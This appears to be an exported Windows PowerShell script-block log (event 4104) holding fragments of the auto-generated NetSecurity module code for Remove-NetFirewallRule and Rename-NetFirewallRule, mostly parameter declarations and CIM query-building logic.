    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetServiceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallServiceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByQuery', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true)]
    [Parameter(ParameterSetName='GetAll', Mandatory=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true)]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletiz

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (11 of 19):
    $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Direction') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Direction})
        $__cmdletization_queryBuilder.FilterByProperty('Direction', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Action') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Action})
        $__cmdletization_queryBuilder.FilterByProperty('Action', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EdgeTraversalPolicy') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EdgeTraversalPolicy})
        $__cmdletization_queryBuilder.FilterByProperty('EdgeTraversalPolicy', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LooseSourceMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LooseSourceMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LooseSourceMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LocalOnlyMapping') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LocalOnlyMapping})
        $__cmdletization_queryBuilder.FilterByProperty('LocalOnlyMapping', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Owner') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Owner})
        $__cmdletization_queryBuilder.FilterByProperty('Owner', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyAppId') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyAppId})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyAppId', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PackageFamilyName') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PackageFamilyName})
        $__cmdletization_queryBuilder.FilterByProperty('PackageFamilyName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetFirewallRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallApplicationFilter') -and (@('ByAssociatedNetFirewallApplicationFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallApplicationFilter}, 'MSFT_NetFirewallRuleFilterByApplication', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetFirewallRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetFirewallRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetFirewallRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallSecurityFilter') -and (@('ByAssociatedNetFirewallSecurityFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallSecurityFilter}, 'MSFT_NetFirewallRuleFilterBySecurity', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallServiceFilter') -and (@('ByAssociatedNetFirewallServiceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallServiceFilter}, 'MSFT_NetFirewallRuleFilterByService', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetFirewallRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallApplicationFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallSecurityFilter', 'ByAssociatedNetFirewallServiceFilter', 'ByAssociatedNetFirewallProfile', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetFirewallRule' -Alias '*'
        

function Rename-NetFirewallRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction[]]
    ${Direction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${Action},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal[]]
    ${EdgeTraversalPolicy},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('LSM')]
    [ValidateNotNull()]
    [bool[]]
    ${LooseSourceMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${LocalOnlyMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [stri

ScriptBlock ID: a9566490-7339-4e56-b9a5-98febda235bb
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (10 of 19):
andardcimv2/MSFT_NetFirewallRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Direction[]]
    ${Direction},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action[]]
    ${Action},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EdgeTraversal[]]
    ${EdgeTraversalPolicy},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('LSM')]
    [ValidateNotNull()]
    [bool[]]
    ${LooseSourceMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${LocalOnlyMapping},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Owner},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyAppId},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PackageFamilyName},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetApplicationFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallApplicationFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetNetworkLayerSecurityFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallSecurityFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetServiceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallServiceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallSecurityFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallServiceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallApplicationFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
